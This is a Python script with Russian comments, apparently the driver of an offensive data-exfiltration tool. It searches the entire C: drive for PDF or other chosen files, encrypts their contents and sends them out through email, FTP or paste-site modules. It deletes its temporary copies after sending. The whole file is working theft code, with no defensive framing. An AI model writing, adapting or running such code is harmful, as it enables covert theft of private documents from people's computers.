from cryptor import encrypt, decrypt
from email_exfil import outlook, plain_email
from transmit_exfil import plain_ftp, transmit
from paste_exfil import ie_paste, plain_paste

import os

EXFIL = {
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit': transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste,
}

def find_docs(doc_type='.pdf'):
    for parent, _, filenames in os.walk('c:\\'):
        for filename in [x for x in filenames if x.endswith(doc_type)]:
            document_path = os.path.join(parent, filename) # ищем на диске C все файлы определенного расширения (по умолчанию .pdf) yield отдает данные по одному экономя память если таких файлов тысячи
            yield document_path

def exfiltrate(document_path, method):
    if method in ['transmit', 'plain_ftp']:
        filename = f'c:\\windows\\temp\\{os.path.basename(document_path)}' # собираем полный путь
        with open(document_path, 'rb') as f0: # из найденного файла читаем данные
            contents = f0.read() 
        with open(filename, 'wb') as f1:
            f1.write(encrypt(contents)) # и записываем в новый путь
        
        EXFIL[method](filename) # отправляем файл через выбранный метод
        os.unlink(filename) # после отправки удаляет файл с диска
    else:
        with open(document_path, 'rb') as f:
            contents = f.read() # читаем исходники
        title = os.path.basename(document_path) # берем имя файла из полного пути
        contents = encrypt(contents) # кодируем его
        EXFIL[method](title, contents) # и 2 образца отправляем на эксфильтрацию

if __name__ == '__main__':
    for fpath in find_docs():
        exfiltrate(fpath, 'ie_paste')

   
